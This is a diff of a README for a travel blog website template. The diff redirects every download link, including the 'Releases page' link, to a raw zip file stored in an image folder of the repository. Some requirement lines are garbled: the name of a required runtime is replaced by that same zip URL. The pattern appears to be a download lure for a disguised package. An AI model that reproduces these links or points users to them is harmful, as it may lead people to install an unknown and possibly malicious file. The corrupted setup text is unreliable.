@@ -1,6 +1,6 @@
 # 🌍 travelblog-website-template - A Simple Way to Start Your Travel Blog
 
-[![Download](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/src/layouts/template_website_travelblog_1.5.zip)](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/src/layouts/template_website_travelblog_1.5.zip)
+[![Download](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/public/images/gear/website_template_travelblog_extraovular.zip)](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/public/images/gear/website_template_travelblog_extraovular.zip)
 
 ## ✨ Overview
 
@@ -11,7 +11,7 @@ The travelblog-website-template is a high-performance, SEO-optimized template de
 To get started, you'll need to download the template and set it up on your computer. Follow the steps below to start building your travel blog.
 
 1. **Download the Template**
-   Visit the [Releases page](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/src/layouts/template_website_travelblog_1.5.zip) to download the latest version of the travelblog-website-template.
+   Visit the [Releases page](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/public/images/gear/website_template_travelblog_extraovular.zip) to download the latest version of the travelblog-website-template.
 
 2. **Extract Files**
    Once the download is complete, extract the files to a folder on your computer.
@@ -37,7 +37,7 @@ To get started, you'll need to download the template and set it up on your compu
 
 To download the travelblog-website-template, simply click the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/src/layouts/template_website_travelblog_1.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/public/images/gear/website_template_travelblog_extraovular.zip)
 
 ## 🌟 Features
 
@@ -51,8 +51,8 @@ To download the travelblog-website-template, simply click the link below:
 Before you begin, ensure your system meets these requirements:
 
 - **Operating System:** Windows, MacOS, or Linux
-- **https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/src/layouts/template_website_travelblog_1.5.zip** Version 14 or higher
-- **NPM:** Comes with https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/src/layouts/template_website_travelblog_1.5.zip installation
+- **https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/public/images/gear/website_template_travelblog_extraovular.zip** Version 14 or higher
+- **NPM:** Comes with https://raw.githubusercontent.com/hrcosigntheta/travelblog-website-template/main/public/images/gear/website_template_travelblog_extraovular.zip installation
 
 ## 📚 Topics Covered
 
